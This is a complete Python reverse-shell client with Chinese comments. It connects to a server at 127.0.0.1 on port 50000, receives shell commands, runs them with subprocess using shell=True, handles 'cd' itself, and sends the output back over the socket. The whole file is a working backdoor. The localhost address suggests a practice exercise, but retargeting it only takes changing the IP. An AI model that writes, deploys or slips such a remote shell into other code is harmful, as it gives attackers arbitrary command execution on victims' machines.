from socket import *
import os

IP = '127.0.0.1'
PORT = 50000
BUFLEN = 4096

dataSocket = socket(AF_INET, SOCK_STREAM)
dataSocket.connect((IP, PORT))

try:
    while True:
        # 接收命令
        recved = dataSocket.recv(BUFLEN)
        if not recved:
            break

        command = recved.decode('utf-8').strip()

        # 判断是否是'cd'命令
        if command.startswith("cd "):
            try:
                target_dir = command[3:].strip()
                os.chdir(target_dir)  # 执行目录变化
                response = f"Changed directory to {os.getcwd()}"
            except Exception as e:
                response = f"Error changing directory: {str(e)}"
        else:
            # 执行其他命令
            try:
                from subprocess import Popen, PIPE
                process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
                output, errors = process.communicate()

                # 解码输出内容
                output_decoded = output.decode('utf-8', errors='ignore') if output else "No output."

                response = f"Output:\n{output_decoded}\n".strip()
            except Exception as e:
                response = f"Command execution error: {str(e)}"

        # 发送命令执行结果给服务端
        dataSocket.send(response.encode('utf-8')[:BUFLEN])

finally:
    dataSocket.close()
